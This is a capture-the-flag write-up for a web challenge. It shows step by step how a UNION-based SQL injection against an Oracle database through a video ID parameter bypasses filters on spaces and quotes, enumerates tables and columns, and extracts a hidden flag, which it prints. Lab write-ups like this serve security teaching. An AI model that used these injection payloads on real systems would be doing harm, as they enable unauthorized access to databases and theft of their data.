# Cathub v2

## Description:

> jin-duen-jiang is too easy, let's play cathub!

## Solution:

When access any video, `vid` will be sent to OracleDB as part of the url, which is the vulnerability.

First find the number of columns. Note that space is blocked, so need to bypass using `/**/` or `%0a`. `'` and `chr` are also block. In the end there are 3 columns.

```
?vid=-1 union select 1,null,null from dual
```

Next, find the table name.

```
?vid=-1 union select null,table_name,null from user_tables offset 1 rows fetch first 1 rows only

?vid=-1 union select null,table_name,null from user_tables offset 2 rows fetch first 1 rows only

?vid=-1 union select null,table_name,null from user_tables offset 3 rows fetch first 1 rows only
```

There's a table named `S3CRET`, so we can find out it's columns. Since `'` is blocked, we can't use `where table_name='S3CRET'`. This can be bypassed with `()` and do another query.

```
?vid=-1 union select null,column_name,null from user_tab_columns where
    table_name=(select table_name from user_all_tables offset 5 rows fetch first 1 rows only)
offset 1 rows fetch first 1 rows only
```

There's a column named `V3RY_S3CRET_C0LUMN`, so we only need to extract its value.

```
?vid=-1/**/union/**/select/**/null,V3RY_S3CRET_C0LUMN,null/**/from/**/S3CRET
```

The flag shown in the title is all caps, due to CSS. Simply inspect element to view the actual flag.

`FLAG{hey___or@cle_d4tab4s3__inj3cti0n_i5____to0OoO0ooO0OO_e4sy!!!!!??}`
